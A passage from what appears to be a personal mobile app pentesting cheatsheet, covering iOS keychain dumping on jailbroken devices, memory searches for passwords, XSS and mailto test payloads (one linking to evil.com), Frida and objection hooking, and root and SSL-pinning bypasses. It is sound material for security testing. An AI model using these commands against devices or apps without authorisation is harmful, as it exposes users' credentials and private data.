sed -i '' 's/KEYCHAIN_DUMPER_FOLDER=\/usr\/bin/KEYCHAIN_DUMPER_FOLDER=\/var\/jb\/usr\/bin/g' updateEntitlements.sh

scp keychain_dumper mobile@<deviceip>:/var/jb/usr/bin/
scp updateEntitlements.sh

### SSH on iOS device
chmod +w /var/jb/usr/bin/keychain_dumper
chmod +w /var/jb/usr/bin/updateEntitlements.sh
chmod +r /private/var/Keychains/keychain-2.db

/var/jb/usr/bin/updateEntitlements.sh
/var/jb/usr/bin/keychain_dumper > result.txt
~~~

**Note**: Some keychain entries are available regardless of whether the iOS is locked or not, while other entries will only be accessible if the iOS device is unlocked.

Check if keychain is being used somewhere in the application:

~~~shell
strings <binary> | grep -i SecItem
~~~

Dump application's keychain content with `objection`:

~~~shell
### Open the app with objection (will be DEPRECATED)
objection -g <app identifier> explore

### Get user defaults content
> ios keychain dump
~~~

##### CoreData

Core data is saved as .sqlite or as .store database at the following path: `/var/mobile/Containers/Data/Application/<data id>/Library/Application Support`

**Note**: when copying the .sqlite database, remember to copy also the '-shm' and '-wal' files! Otherwise, the db would be empty.

##### Cache

Cache data is stored at path: `/var/mobile/Containers/Data/Application/<data id>/Library/Caches

##### Keyboard Cache

Several options, such as autocorrect and spell check, are available to users to simplify keyboard input and are cached by default in `.dat` files in `/private/var/mobile/Library/Keyboard/` and its subdirectories.

##### Yap Database

Data is stored in the `database2` table. The column containing the data is a blob containing a serialized `NSKeyedArchiver` object.
Use the following script to dump the YapDatabase.sqlite decoded content:

~~~python
###!/usr/bin/env python3
import argparse
import sqlite3
import plistlib

def main():
    parser = argparse.ArgumentParser(
        description="Query a YapDatabase SQLite file and try to decode plist blobs."
    )
    parser.add_argument("db", help="Path to YapDatabase.sqlite file")
    args = parser.parse_args()

    conn = sqlite3.connect(args.db)
    cur = conn.cursor()
    try:
        cur.execute("SELECT * FROM database2")
    except sqlite3.Error as e:
        print(f"[!] SQL error: {e}")
        return

    rows = cur.fetchall()
    for row in rows:
        decoded = []
        for col in row:
            if isinstance(col, bytes):
                try:
                    decoded_obj = plistlib.loads(col)
                    decoded.append(decoded_obj)
                except Exception:
                    decoded.append(f"<binary {len(col)} bytes>")
            else:
                decoded.append(col)
        print(decoded)

    conn.close()

if __name__ == "__main__":
    main()

~~~

##### Background Screenshot

By default, a screenshot is saved when the application goes into the background:

- Screenshots are stored inside the app's container at`/var/mobile/Containers/Data/Application/$APP_ID/Library/SplashBoard/Snapshots/sceneID:$APP_NAME-default/`.

#### Crypto

Monitor cryptographic functions such as encryption, decryption, and hashing as they are executed in real time with `objection`:

~~~shell
ios monitor crypto
~~~

#### Inter-Process-Communication

###### Universal Links & URL Schemes

Check what universal links are allowed by looking for the entitlement `com.apple.developer.associated-domains`.

Validate Apple App Site Association (AASA) - Universal Links with [yurl](https://github.com/chayev/yurl):

~~~shell
yurl aasa validate <domain>
~~~

URL schemes are registered in the `Info.plist` in the `CFBundleURLTypes` property.

- Deeplinks handler are usually Scenes. Those are generally registered in the `UIApplicationSceneManifest` property in the `Info.plist`.

Enumerate possible Universal Links or app links using URL Schemes:

~~~shell
strings <binary> | grep "://"
~~~

Open a link on an iOS device (ssh to to device) using `uiopen`:

~~~shell
uiopen <link>
~~~

Open a link on an iOS simulator:

~~~shell
xcrun simctl openurl booted '<INSERT_URL_HERE>'
~~~

Trace `openURL` usage with `frida-trace`:

~~~shell
frida-trace -U -m "*[* *openURL*]" -p <app PID>
~~~

##### App Extensions

Grep for `NSExtensionPointIdentifier` among all files inside the app bundle (IPA or installed app):

~~~shell
grep -nr NSExtensionPointIdentifier <app folder>
~~~


Look for `NSExtensionActivationRule` property in the `Info.plist`. That key specifies the data being supported as well as e.g. maximum of items supported

Hook `NSExtensionContext - inputItems` in the data originating app.

### Input Validation

In web views' form fields, try inject some of these payloads:

~~~html
<!-- XSS -->
<script>alert(1)</script> <!-- or any xss payload -->

<!-- Open Mail App -->
<a href="mailto:no-one@testemail?subject=look at this website&body=Hi,I found this website and thought you might like it http://evil.com">Open email app</a>

<!-- Open Phone App -->
<a href="tel:+1-847-555-5555">Open phone app</a>
~~~

#### Memory Analysis

Dump memory with `objection`:

~~~objection
> memory dump all <output directory>
~~~

Search string in memory with `objection`:

~~~objection
> memory search Password --string
~~~

Search bytes in memory with `objection`:

~~~objection
> memory search "<space-separated bytes>" 

### Simple example: "50 61 73 73 77 6f 72 64" // Password
### Placeholder example: "50 ?? 73 73 77 ?? ?? 64" //P?ssw??d
~~~

Dump memory with [fridump3](https://github.com/rootbsd/fridump3):

~~~shell
python3 fridump3.py -u -s -o <output dir>
~~~


#### Network Traffic Analysis

Since iOS 5, devices have included a **Remote Virtual Interface (RVI)** facility. An RVI allows to forward packets from a connected iOS device to a virtual network interface on the Mac.

Create a RVI for a connected device with `rvictl`; after running this command a new network interface is added (such as`rvi0`):

~~~shell
rvictl -s <device UDID>
~~~

The device UDID can be found by using `xcrun`:

~~~shell
xcrun xctrace list devices
### OR only booted simulators
xcrun simctl list | grep "Booted"
~~~

Capture network traffic with `tcpdump`:

~~~shell
sudo tcpdump -i <rvi interface> -w <outut .pcap>
~~~

Remove the RVI interface with `rvictl`:

~~~shell
rvictl -x <device UDID>
~~~

#### Hooking

Trace ObjC methods invocations with `frida-trace`:

~~~shell
frida-trace -U -m "<return type>[<class name> <method name>]" -p <PID>
~~~

where:

- `return type`: `-` for instance method, `+` for class method, `*` for any
- `class name`: name of the class or `*` for any
- `method name`: name of the method or `*` for any

Search loaded classes with `objection`:

~~~objection
> ios hooking search classes <keyword>
~~~

Search loaded methods with `objection`:

~~~objection
> ios hooking search methods <keyword>
~~~

List Loaded Classes with `objection`:

~~~objection
> ios hooking list classes
~~~

Explore Methods of a Class with `objection`:

~~~objection
> ios hooking list class_methods <class>
~~~

Hook all class' methods with `objection`:

~~~objection
> ios hooking watch class "<class name>"
~~~

Hook Methods with `objection`:

~~~objection
> ios hooking watch method "+[<class> <method>]" --dump-args --dump-return
~~~

Objection will print out details whenever this method is called during the app’s execution.

Patch a method at runtime with `objection`:

~~~objection
> ios hooking set return_value "+[<class> <method>]" false
~~~

### Logging

 For both devices and simulators, it's possible to use `Console`.

#### Logging on device


Use `idevicesyslog`:

~~~shell
brew install libimobiledevice
idevicesyslog | grep MyApp
~~~

#### Logging on simulator

Logs are located at:

~~~
~/Library/Logs/CoreSimulator/<DEVICE ID>/system.log
~~~
  
Where `<DEVICE ID>` can be found on the `Simulator` app.

Alternatively, it's possible to get logs with `xcrun`:

~~~shell
xcrun simctl spawn booted log stream --predicate 'eventMessage contains "<app package>"' --level debug
~~~


### FAQ

#### 1. IPA crashes without logs on simulator

1. Check that the app is compiled for the correct architecture [[###Check Architecture]]
2. Check that the app is compiled for simulator [[###Check target build platform]]
3. Check that the simulator's iOS version is at least the minimum supported OS version [[###Plist content]]
4. Verify that there are no absolute paths from the building machine in the RPATH [[###Check runtime paths]]
	1. If some path is found, remove it with the following command: `install_name_tool -delete_rpath "<absolute path>" <appname>.app/<appname>`
	2. Re-sign the application with following command: `codesign --force --sign - --deep <appname>.app`
	3. Uninstall and re-install the IPA/APP [[###Install IPA/APP on simulator]]


#### 2. Objection 

PROBLEM: Crashes with error `frida.core.RPCException: ReferenceError: 'ObjC' is not defined`:

-  REASON: Frida server has a version still not supported by objection

SOLUTION 1  - UPGRADE OBJECTION TO DEV VERSION (until pull request is not merged): 

1. Clone the objection repository: `git clone https://github.com/sensepost/objection.git`
2. Fetch this [pull request](https://github.com/sensepost/objection/pull/734): `git fetch origin pull/734/head:objection-pr734`
3. Switch to the newly created branch: `git switch objection-pr734`
4. Install node agent: `npm install && npm run build`
5. Install objection (e.g. using pipx): `pipx install ./`

SOLUTION 2 - DOWNGRADE FRIDA ON THE iOS DEVICE

1. On the iPhone, get a compatible frida (server) version deb package (e.g for objection 1.11, compatible frida is 16.5.2): `wget https://github.com/frida/frida/releases/download/16.5.2/frida_16.5.2_iphoneos-arm64.deb`
2. On the iPhone, downgrade frida: `dpkg -i frida_16.5.2_iphoneos-arm64.deb`
3. On the mac, downgrade frida (client) in the objection virtual environment: `python -m pip uninstall frida frida-tools && python -m pip install frida==16.5.2 frida-tools`

### Utils

#### iOS Device

Get iOS device id:

~~~shell
idevice_id
~~~

Get iOS device info:

~~~shell
ideviceinfo
~~~

List installed apps:

~~~shell
brew install ideviceinstaller
ideviceinstaller -l
~~~

Install IPA:

~~~shell
ideviceinstaller -i <ipa>
~~~

Uninstall app:

~~~shell
ideviceinstaller --uninstall <app bundle name>
~~~

Create encrypted backup of the iOS device:

~~~shell
idevicebackup2 encryption on "<password>"
idevicebackup2 backup --full <output directory>
~~~

Restore a backup:

~~~shell
idevicebackup2 restore --system --settings --password "<password>" <backup directory>
~~~


Get backup information:

~~~shell
idevicebackup2 info <backup directory>
~~~

#### MacOS 

Keyboard Shortcuts:

- Tilde (~) -> Options + 5
- Region screenshot to clipboard -> Shift + Command +Control + 4
- Backticks (\`) -> Options + \

Send command output to clipboard:

~~~shell
<command> | pbcopy
~~~
### iOS - Todo

- https://github.com/GhidraEnjoyr/iOS-Reverse-Engineering?tab=readme-ov-file###basics-of-ios
- lldb debug

## Flutter

Useful resources:

- https://github.com/ptswarm/reFlutter
- https://docs.flutter.dev/reference/security-false-positives

#### SSL Pinning Bypass

Usually with *frida* you can bypass the SSL pinning using the js scripts, but with Flutter is different.

- You need to load the base address of the .so library and then apply your script.

Pay attention if the app is in Release or Debug mode. Because the name of the .so library is different and will not be found by common tools like *reflutter*.

~~~java
@override
HttpClient createHttpClient(SecurityContext? context) {
	return super.createHttpClient(context)
	// set proxy
	..findProxy = (uri) {
		return "PROXY localhost:8080";
	};
}
~~~

The following frida script works fine: [https://github.com/NVISOsecurity/disable-flutter-tls-verification](https://github.com/NVISOsecurity/disable-flutter-tls-verification)

### HTTP Traffic Interception

#### Frida Flutter Proxy

The following script allow to bypass SSL pinning and redirect HTTP traffic to the specified proxy: [frida-flutterproxy](https://github.com/hackcatml/frida-flutterproxy).

**Note**: This script won't work as it is with `frida` versions lower than 17 due to the usage of the function `Module.getGlobalExportByName` which was introduced with this version.

- To make the script work with previous `frida`versions, such as 16, replace every `Module.getGlobalExportByName(name)` occurrence with `Module.getExportByName(null, name)`

#### Network level traffic interception
References:

- [https://blog.nviso.eu/2022/08/18/intercept-flutter-traffic-on-ios-and-android-http-https-dio-pinning/](https://blog.nviso.eu/2022/08/18/intercept-flutter-traffic-on-ios-and-android-http-https-dio-pinning/)
- [https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/](https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/)

If [[mobile-cheatsheet#Frida Flutter Proxy|Frida Flutter Proxy]] method does not work, try the following.

Flutter does not use system proxy configuration and it doesn’t use the system’s certificate store. Therefore, it's not possible to directly intercept the HTTP traffic generated by flutter applications. In order to overcome this problem, try the following solutions (**still requiring SSL pinning bypass**):

- **Android**: use an intermediary apps such as ProxyDroid, Proxifier or [VProxyid](https://github.com/ProxidBean/VProxid).
- **iOS**: use a VPN and redirect HTTP and HTTP traffic to proxy listening port by mean of iptables. Note that this method works also for Android.
	- Here's a script setting up a Wireguard VPN server and configuring the iptables: [vpn-proxy.sh](https://github.com/ojack69/vpn-proxy)

Another alternative is this script generated with Claude, which merges SSL Pinning bypass technique from [https://github.com/NVISOsecurity/disable-flutter-tls-verification](https://github.com/NVISOsecurity/disable-flutter-tls-verification) with the proxying from [frida-flutterproxy](https://github.com/hackcatml/frida-flutterproxy):

- [flutter-tls-bypass-and-proxy.js](https://github.com/ojack69/jacks-corner/tree/main/scripts/Misc)
### Flutter enumeration

Dump flutter packages, after unpacking the APK:  

~~~shell
strings libapp.so | grep package:
~~~

## Frida & Objection

References:

- [https://frida.re/docs/javascript-api/#java](https://frida.re/docs/javascript-api/#java)

Useful Resources:

- [https://codeshare.frida.re/browse](https://codeshare.frida.re/browse)

List processes:

~~~shell
// -U - USB Device
frida-ps -U

// -a - List only applications
frida-ps -Ua


// -i - List all installed applications
frida-ps -Uai
~~~

Connect to process:

~~~shell
// Connect by name (-n)
frida -U -n "<process name>"

// Connect by package (-f)
frida -U -f com.jack.ovaasolution

objection --gadget|-g <package name> explore
~~~

Await for process to spawn:

~~~shell
frida -U -W '<package name>' 
~~~

Run script:

~~~shell
// Run script on load*
frida -U -f <package> -l <script> 

// Run script in the attached process
[frida]-> %exec <script>
~~~

\*Note: a script attached on load will re-run every time it's modified - REPL mode

Patch APK to inject Frida gadget, for non-rooted devices:

~~~shell
// Get device architecture
[adb shell] getprop ro.product.cpu.abi
[adb shell] getprop ro.product.cpu.abilist (alternative)


objection patchapk --source <apk path> -a <architecture> [--use-aapt2]

~~~

Root bypass:

~~~shell
frida --codeshare dzonerzy/fridantiroot -f <package>

[objection -g <package name> explore -s] "android root disable"
~~~

List hookable method in class:

~~~shell
objection> android hooking list class_methods <classname>
~~~

Watch class and class methods invocatations:

~~~shell
objection> android hooking watch class <package.class> [--dump-backtrace --dump-args --dump-return]

objection> android hooking watch class_method <package.class.method> [--dump-backtrace --dump-args --dump-return]
~~~

Search or write in memory:

```
objection> memory search "<pattern eg: 41 41 41 ?? 41>" (--string) (--offsets-only)
objection> memory write "<address>" "<pattern eg: 41 41 41 41>" (--string)
```
### Code Snippets

Read from and transform to byte array:

~~~javascript
function fromByteArray(arr){
    let result = "";
    for(let i=0; i < arr.length; i++){
        result += String.fromCharCode(arr[i]);
    }
    return result
}


function toByteArray(str){
    let result = [];
    for(let i=0; i < str.length; i++){
        result.push(str.charCodeAt(i));
    }
    return result
}
~~~

Attach to method implementation:

~~~javascript
const func = ObjC.classes[<class>][<method signature>];
Interceptor.attach(func.implementation,{
    onEnter: function(args){
	    // do something
    },
    onLeave: function (retval) {
        // do something
    }
});
~~~

Attach to native functions:

~~~javascript
Interceptor.attach(Module.findExportByName("<native lib>", "<function>"), {
    onEnter: function (args) {        
	    // Set a custom property
	    this.custom = "yes";
		// args[0] is a expected to be a pointer to a string
		console.log(Memory.readUtf8String(args[0]));
    },
    onLeave: function (retval) {
	    if(this.custom == "yes"){
		    retval.replace(0) // Replace return value
	    }
    }
});
~~~


Replace native function implementation:

~~~javascript
const strstrPtr = Module.getExportByName('libc.so', 'strstr');
    const strstr = new NativeFunction(strstrPtr, 'pointer', ['pointer', 'pointer']);
    Interceptor.replace(strstrPtr, new NativeCallback((haystack, needle) => {
        const haystackStr = Memory.readUtf8String(haystack);
        const needleStr = Memory.readUtf8String(needle);
        
        console.log(haystackStr);
        console.log(needleStr);
        
        const res = strstr(haystack, needle);
        return new NativePointer(res);

    }, 'pointer', ['pointer', 'pointer']));
~~~

Attach to all exported functions of a module:

~~~javascript
const lib = "libfoo.so";
Module.enumerateExportsSync(lib).map((x) => {
        if (x.type == "function") {
            console.log("[!] Attaching to: " + x.name);
            Interceptor.attach(Module.findExportByName(lib, x.name), {
                onEnter: function (args) {
                    console.log("Entering " + x.name);
                },
                onLeave: function (retval) {
                    console.log("Leaving " + x.name);
                }
            });
        }
    });
~~~

Attach to module internal function (not exported):

~~~javascript
const offset = 0x00000fa0; // from radare2 or Ghidra (for Ghidra see this: https://stackoverflow.com/questions/68332781/frida-hook-native-non-exported-functions)
const baseAddress = Module.getBaseAddress(<module name>);
Interceptor.attach(baseAddress.add(offset), {
	onEnter: function (args) {
		console.log("Entered internal function");
		this.buff = args[0];
		
	},
	onLeave: function (retval) {
		console.log("Hex dump the result ");
		console.log(hexdump(retval, {
			offset: 0, 
				length: 24, 
				header: false,
				ansi: false
		}));
		// OR use saved buffer pointer in the onEnter hook if retval is something different
		const buff = Memory.readByteArray(this.buff,numBytes);
		console.log(hexdump(buff, {
			offset: 0, 
				length: 24, 
				header: false,
				ansi: false
		}));
	}
});
~~~

Scan memory for pattern:

~~~javascript
 const flagLib = Process.getModuleByName("libflag.so");
        const res = Memory.scanSync(flagLib.base, flagLib.size, "4d 48 4c 7b"); // Search for MHL{
        if (res.length > 0) {
            res.forEach(element => {
                try{
                    console.log(Memory.readUtf8String(element.address));    
                }catch(e){
                    console.log("[x] Cannot read memory at " + element.address + "as string")
                }
                
            });
        }
~~~

It's possible to use "?" as placeholder.

Attach to an Objective-C class' instance method:

~~~javascript
if (ObjC.available) {
    var targetClass = ObjC.classes['<target class>'];

    Interceptor.attach(targetClass["<method signature>"].implementation, {
        onLeave: function (retval) {
			// Do something
        }
    });
}

~~~

Invoke class instance method - iOS:

~~~javascript
ObjC.choose(ObjC.classes['Captain_Nohook.ViewController'],{
    onMatch: (instance) => {
        console.log("[!]Flag is: " + instance['- flag']().text())
    }, 
    onComplete: () => {
        // Do nothing
    }
})
~~~

Invoke class instance method - Android: https://alyagomaa.github.io/blog/Using-Frida-to-call-unused-android-methods/

For iOS, function arguments start from index 2 and can be processed as follows:

~~~javascript
onEnter: function(args){
 console.log("[>] Arguments: " + new ObjC.Object(args[2]));;
},
~~~

Initialise a `NSString` object:

~~~javascript
var nsstring = ObjC.classes.NSString.stringWithString_("rickfromfrida");
~~~

`UIKit` code must be ran on the main thread in order to properly work. The following snippet allows to queue function on the main thread queue:

~~~javascript
ObjC.schedule(ObjC.mainQueue, function () {
    // <-- All UIKit code goes here
});
~~~

Close keyboard (globally) - from ChaptGPT:

~~~ javascript
function closeKeyboard(){
    ObjC.schedule(ObjC.mainQueue, function () {
       const app = ObjC.classes.UIApplication.sharedApplication();
       var sel = ObjC.selector("resignFirstResponder");
       // sendAction:to:from:forEvent:
       app.sendAction_to_from_forEvent_(sel, null, null, null);       
    })
}
~~~

Close keyboard (globally) invoking `- endEditing:YES`:

~~~javascript
function closeKeyboard(f=null){
    let controllers = Object.keys(ObjC.classes);
    if(f != null){
        controllers = controllers.filter(x=>x.includes(f));
    }
    controllers.forEach((c, _) => {
        // Get the active instance for that controller, whether it exists
        ObjC.choose(ObjC.classes[c],{
        	onMatch: (instance) => {
                // use '- endEditing:' for closing the keyboard on the active controller's view
                ObjC.schedule(ObjC.mainQueue, function () {
        			instance.view()['- endEditing:']();
        		})
        	}, 
        	onComplete: () => {
        		// Do nothing
        	}
        })
    })
}
~~~

Close keyboard in specific view invoking `- endEditing:YES` (for iOS):

~~~javascript
const controller = ObjC.classes['<controller class name>']

ObjC.choose(controller,{
	onMatch: (instance) => {
		ObjC.schedule(ObjC.mainQueue, function () {
			instance.view()['- endEditing:']()
		})
	}, 
	onComplete: () => {
		// Do nothing
	}
})
~~~

Dump `char *arr[]` (array of char pointers):

~~~javascript
const readString = Memory.readUtf8String;
function dumpCharPointerArray(arrayPtr){
    var values = [];
    var idx = 0;
    while (true) {
        // readPointer at arrayPtr + idx * pointerSize
        var rawPtr = arrayPtr.add(idx * Process.pointerSize);
        var valuePtr = Memory.readPointer(rawPtr);
        if (valuePtr.isNull()) break;
        var s = readString(valuePtr);
        values.push(s);
        idx++;
    }
    return values
}
~~~

Hook `posix_spawn` (based on [frida-launchd-spawn.js](https://gist.github.com/trufae/06cd2a4a5e2b1b4ad1a30e5b72d4d2c5)):

~~~javascript
Interceptor.attach(Module.findExportByName('/usr/lib/system/libsystem_kernel.dylib', 'posix_spawn'), {
    onEnter: function (args) {

    // Dump argv if present
    try {
        const argv_ptr = args[4];
        if (!argv_ptr.isNull()) {
            const argv = dumpCharPointerArray(argv_ptr)
            if (argv.length > 0) {
                // pretty print
                console.log('posix_spawn argv (' + argv.length + '):');
                for (var i = 0; i < argv.length; i++) {
                    console.log('  [' + i + '] ' + argv[i]);
                }
            }
        }
    } catch (e) {
        // safe fallback if reading memory fails
        console.log('error reading argv: ' + e);
    }
  },
  onLeave: function (ret) {
  }
});
~~~
